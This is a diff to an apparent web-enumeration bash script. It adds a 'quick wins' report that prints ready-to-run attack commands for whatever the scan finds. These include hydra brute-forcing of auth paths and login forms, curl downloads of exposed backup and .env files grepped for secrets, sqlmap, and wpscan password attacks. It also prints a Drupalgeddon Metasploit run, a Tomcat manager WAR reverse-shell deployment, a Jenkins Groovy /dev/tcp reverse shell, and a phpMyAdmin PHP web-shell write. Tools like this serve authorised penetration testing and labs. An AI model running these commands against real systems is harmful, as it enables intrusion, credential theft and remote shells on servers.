@@ -1011,13 +1011,17 @@ generate_summary() {
         # --- Next Steps ---
         echo "## Next Steps"
         echo ""
-        echo "1. Open \`summary.md\` findings in Burp Suite for manual testing"
-        echo "2. Check 401/403 endpoints — try authentication bypass techniques"
-        echo "3. Check redirect destinations — 301/302 may point to interesting paths"
-        echo "4. Review source_hints.txt for hardcoded paths, version strings"
-        echo "5. If vhosts found: add to /etc/hosts and run webenum per vhost"
+        echo "1. **Burp Suite** — open interesting 200/401 paths for manual testing"
+        echo "2. **401/403 paths** — try hydra default creds (see quick_wins.txt)"
+        echo "3. **Login forms** — hydra http-post-form or manual: admin/admin, admin/password"
+        echo "4. **Sensitive files** (.bak/.sql/.env) — curl download + grep for creds"
+        echo "5. **VHosts found** — add to /etc/hosts, re-run: \`./webenum.sh --url http://<vhost>\`"
+        echo "6. **Parameters** — test for SQLi: \`sqlmap -u '${url}?param=1' --batch\`"
+        if grep -qi 'WordPress' "$work_dir/fingerprint/whatweb.txt" 2>/dev/null; then
+            echo "7. **WordPress** — \`wpscan --url ${url} --enumerate u,vp,vt\`"
+        fi
         if [[ "$DEEP_MODE" != "true" ]]; then
-            echo "6. If stuck: re-run with \`--deep\` for recursive + parameter fuzzing"
+            echo "8. **Stuck?** — re-run with \`--deep\` for recursive + parameter fuzzing"
         fi
         echo ""
         echo "---"
@@ -1038,6 +1042,17 @@ generate_summary() {
         echo "## Robots.txt"
         grep -i 'Disallow:' "$work_dir/fingerprint/robots.txt" 2>/dev/null | \
             sed 's/^/  ROBOTS: /'
+        # Per-entry curl probe for disallowed paths
+        local disallow_paths
+        disallow_paths=$(grep -i 'Disallow:' "$work_dir/fingerprint/robots.txt" 2>/dev/null \
+            | grep -oP 'Disallow:\s*\K\S+' | grep -v '^\*$' | head -10)
+        if [[ -n "$disallow_paths" ]]; then
+            echo ""
+            echo "  NEXT: probe robots.txt disallowed paths:"
+            while IFS= read -r rpath; do
+                echo "  curl -sk -o /dev/null -w '%{http_code} ${url%/}${rpath}\n' '${url%/}${rpath}'"
+            done <<< "$disallow_paths"
+        fi
 
         echo ""
         echo "## 200 OK Hits"
@@ -1048,14 +1063,182 @@ generate_summary() {
 
         echo ""
         echo "## Auth Required (401)"
+        local auth_paths=()
         for f in "$work_dir/content/"*.txt "$work_dir/content/recursive/"*.txt; do
             [[ -f "$f" ]] || continue
-            grep '| 401 |' "$f" 2>/dev/null | head -5 | sed 's/^/  AUTH: /'
+            while IFS= read -r auth_line; do
+                auth_paths+=("${auth_line}")
+                echo "  AUTH: ${auth_line}"
+            done < <(grep '| 401 |' "$f" 2>/dev/null | head -5)
         done
+        if (( ${#auth_paths[@]} > 0 )); then
+            echo ""
+            echo "  NEXT (401 paths — try default creds or auth bypass):"
+            for auth_line in "${auth_paths[@]:0:3}"; do
+                local auth_path
+                auth_path=$(echo "${auth_line}" | awk '{print $1}')
+                echo "  hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url} http-get ${auth_path}"
+            done
+        fi
+
+        echo ""
+        echo "## Sensitive Files Found"
+        local sens_found=false
+        for f in "$work_dir/content/"*.txt; do
+            [[ -f "$f" ]] || continue
+            local sens_hits
+            sens_hits=$(grep -iE '\.(bak|sql|env|config|conf|xml|json|zip|tar|gz|old|backup|log).*\| 200 \|' "$f" 2>/dev/null | head -5)
+            if [[ -n "${sens_hits}" ]]; then
+                sens_found=true
+                echo "${sens_hits}" | sed 's/^/  SENS: /'
+            fi
+        done
+        if [[ "${sens_found}" == "true" ]]; then
+            echo ""
+            echo "  NEXT: download and inspect for credentials/secrets:"
+            # Resolve actual paths from hits
+            for f in "$work_dir/content/"*.txt; do
+                [[ -f "$f" ]] || continue
+                grep -iE '\.(bak|sql|env|config|conf|xml|json|zip|tar|gz|old|backup|log).*\| 200 \|' "$f" 2>/dev/null \
+                    | awk '{print $1}' | head -5 \
+                    | while IFS= read -r found_path; do
+                        local clean_path
+                        clean_path="${found_path%%\?*}"  # strip query string if any
+                        echo "  curl -sk ${url%/}${clean_path} -o /tmp/loot_$(basename "$clean_path") && grep -iE 'pass|secret|key|token|user|db_' /tmp/loot_$(basename "$clean_path")"
+                    done
+            done
+        fi
+
+        echo ""
+        echo "## Login Forms Found"
+        local login_found=false
+        for f in "$work_dir/content/"*.txt; do
+            [[ -f "$f" ]] || continue
+            local login_hits
+            login_hits=$(grep -iE '/(login|signin|auth|wp-login|admin).*\| 200 \|' "$f" 2>/dev/null | head -3)
+            if [[ -n "${login_hits}" ]]; then
+                login_found=true
+                echo "${login_hits}" | sed 's/^/  LOGIN: /'
+            fi
+        done
+        if [[ "${login_found}" == "true" ]]; then
+            echo ""
+            echo "  NEXT (login form brute-force — adjust form params first):"
+            echo "  hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url} http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'"
+            echo "  # Always try manual: admin/admin, admin/password, admin/<domain>, admin/<hostname>"
+        fi
+
+        echo ""
+        echo "## WordPress Detected"
+        if grep -qi 'WordPress\|wp-login\|wp-content' "$work_dir/fingerprint/whatweb.txt" 2>/dev/null || \
+           grep -qi 'wp-login\|wp-admin' "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null; then
+            echo "  WordPress detected — run wpscan:"
+            echo "  wpscan --url ${url} --enumerate u,vp,vt --plugins-detection aggressive"
+            echo "  wpscan --url ${url} --enumerate u --passwords /usr/share/wordlists/fasttrack.txt"
+        else
+            echo "  (none detected)"
+        fi
+
+        echo ""
+        echo "## CMS / Framework Detected"
+        {
+            local cms_whatweb="$work_dir/fingerprint/whatweb.txt"
+            local cms_paths="$work_dir/fingerprint/sensitive_paths.txt"
+            local cms_any=false
+
+            # Joomla
+            if grep -qi 'Joomla' "$cms_whatweb" 2>/dev/null || \
+               grep -qi '/administrator' "$cms_paths" 2>/dev/null; then
+                cms_any=true
+                echo "  Joomla detected:"
+                echo "  joomscan --url ${url} --enumerate-components"
+                echo "  curl -sk ${url%/}/administrator/   # admin login panel"
+                echo "  # Brute admin: hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt ${url} http-post-form '/administrator/index.php:username=^USER^&passwd=^PASS^&Submit=Login:F=Invalid'"
+            fi
+
+            # Drupal
+            if grep -qi 'Drupal\|drupal' "$cms_whatweb" 2>/dev/null || \
+               grep -qi 'CHANGELOG.txt\|/user/login' "$cms_paths" 2>/dev/null; then
+                cms_any=true
+                echo "  Drupal detected:"
+                echo "  droopescan scan drupal -u ${url}"
+                echo "  curl -sk ${url%/}/CHANGELOG.txt | head -5   # confirm version"
+                echo "  # Check Drupalgeddon: msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS $ip; run'"
+            fi
+
+            # Apache Tomcat
+            if grep -qi 'Tomcat\|tomcat' "$cms_whatweb" 2>/dev/null || \
+               grep -qi '/manager\|/manager/html' "$cms_paths" 2>/dev/null; then
+                cms_any=true
+                echo "  Apache Tomcat detected:"
+                echo "  curl -sk ${url%/}/manager/html   # manager panel (try tomcat:tomcat, admin:admin)"
+                echo "  nxc http ${url} -u tomcat -p tomcat --path /manager/html"
+                echo "  # Deploy WAR shell: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f war -o shell.war"
+                echo "  # Upload via manager: curl -u 'tomcat:tomcat' -T shell.war '${url%/}/manager/text/deploy?path=/shell'"
+                echo "  # Trigger: curl ${url%/}/shell/"
+            fi
+
+            # Jenkins
+            if grep -qi 'Jenkins\|jenkins' "$cms_whatweb" 2>/dev/null || \
+               grep -qi '/jenkins\|/script' "$cms_paths" 2>/dev/null; then
+                cms_any=true
+                echo "  Jenkins detected:"
+                echo "  curl -sk ${url%/}/login   # unauthenticated check"
+                echo "  # Script console RCE (if admin access): ${url%/}/script"
+                echo "  # Groovy reverse shell in script console:"
+                echo "  # String cmd = 'bash -i >& /dev/tcp/<KALI>/4444 0>&1'"
+                echo "  # ['bash','-c',cmd].execute()"
+            fi
+
+            # phpMyAdmin
+            if grep -qi 'phpMyAdmin\|phpmyadmin' "$cms_whatweb" 2>/dev/null || \
+               grep -qi '/phpmyadmin\|/pma' "$cms_paths" 2>/dev/null; then
+                cms_any=true
+                echo "  phpMyAdmin detected:"
+                echo "  curl -sk ${url%/}/phpmyadmin/   # login page"
+                echo "  # Default creds: root/root, root/<blank>, phpmyadmin/phpmyadmin"
+                echo "  # If access: SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'"
+                echo "  # Trigger: curl '${url%/}/shell.php?cmd=id'"
+            fi
+
+            [[ "$cms_any" == "false" ]] && echo "  (no non-WordPress CMS detected)"
+        }
 
         echo ""
         echo "## VHosts"
-        sed 's/^/  VHOST: /' "$work_dir/vhosts/hosts_entries.txt" 2>/dev/null || true
+        local vhosts_found=false
+        if [[ -s "$work_dir/vhosts/hosts_entries.txt" ]]; then
+            vhosts_found=true
+            sed 's/^/  VHOST: /' "$work_dir/vhosts/hosts_entries.txt" 2>/dev/null
+            echo ""
+            echo "  NEXT: add to /etc/hosts and re-enumerate each vhost:"
+            while IFS= read -r vhost_entry; do
+                [[ -z "${vhost_entry}" ]] && continue
+                local vhost_name
+                vhost_name=$(echo "${vhost_entry}" | awk '{print $2}')
+                [[ -n "${vhost_name}" ]] && echo "  ./webenum.sh --url http://${vhost_name}"
+            done < "$work_dir/vhosts/hosts_entries.txt"
+        else
+            echo "  (none found)"
+        fi
+
+        echo ""
+        echo "## Parameters Discovered"
+        if [[ "$DEEP_MODE" == "true" ]] && [[ -d "$work_dir/params" ]]; then
+            local param_lines
+            param_lines=$(find "$work_dir/params" -name "*.txt" -exec grep -h '.' {} \; 2>/dev/null | grep -v '^No\|^-\|^URL' | head -10)
+            if [[ -n "${param_lines}" ]]; then
+                echo "${param_lines}" | sed 's/^/  PARAM: /'
+                echo ""
+                echo "  NEXT (test parameters for injection):"
+                echo "  sqlmap -u '${url}?<PARAM>=1' --batch --level 2"
+                echo "  # Manual XSS: ${url}?<PARAM>=<script>alert(1)</script>"
+            else
+                echo "  (none found)"
+            fi
+        else
+            echo "  (run with --deep to enable parameter discovery)"
+        fi
 
     } > "$summary_dir/quick_wins.txt"
 
